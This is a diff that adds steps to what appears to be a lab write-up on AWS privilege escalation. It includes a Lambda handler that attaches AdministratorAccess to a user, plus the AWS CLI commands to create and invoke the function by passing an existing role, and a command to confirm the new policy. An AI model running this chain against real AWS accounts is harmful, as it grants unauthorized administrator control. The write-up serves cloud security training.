@@ -48,4 +48,45 @@ aws_secret_access_key = xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 aws_session_token = xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
+- Lambda to escalate privilege-:
+
+```python3
+import boto3
+import json
+
+def lambda_handler(event, context):
+    client = boto3.client('iam')
+    response = client.attach_user_policy(UserName='chris-cgid1n6f5si8o5',PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
+    return {'statusCode': 200, 'body': json.dumps(response)}
+```
+- Zip the file-:
+
+```bash
+zip -r solve.zip solve.py
+```
+- Creating the function with aws cli-:
+
+>A user with the iam:PassRole, lambda:CreateFunction, and lambda:InvokeFunction permissions can escalate privileges by passing an existing IAM role to a new Lambda function that includes code to import the relevant AWS library to their programming language of choice, then using it perform actions of their choice. The code could then be run by invoking the function through the AWS API.
+
+```bash
+aws lambda create-function --function-name unknown_lambda --runtime python3.11 --role arn:aws:iam::865614241237:role/cg-debug-role-<cgid>  --handler solve.lambda_handler --zip-file fileb://solve.zip --region us-east-1
+```
+
+<img width="1918" height="484" alt="image" src="https://github.com/user-attachments/assets/171adbc3-2b75-4c0e-b0ab-11ee14690044" />
+
+- Invoking it-:
+
+```bash
+aws lambda invoke --function-name unknown_lambda output.txt --region us-east-1
+```
+
+- Confirming it-:
+
+```bash
+aws iam list-attached-user-policies --user-name chris-<cgid> --profile lambda_secrets | jq 
+```
+
+<img width="1166" height="304" alt="image" src="https://github.com/user-attachments/assets/d864f7c1-c4e6-4aab-b035-daefe243590c" />
+
+
 -------------------
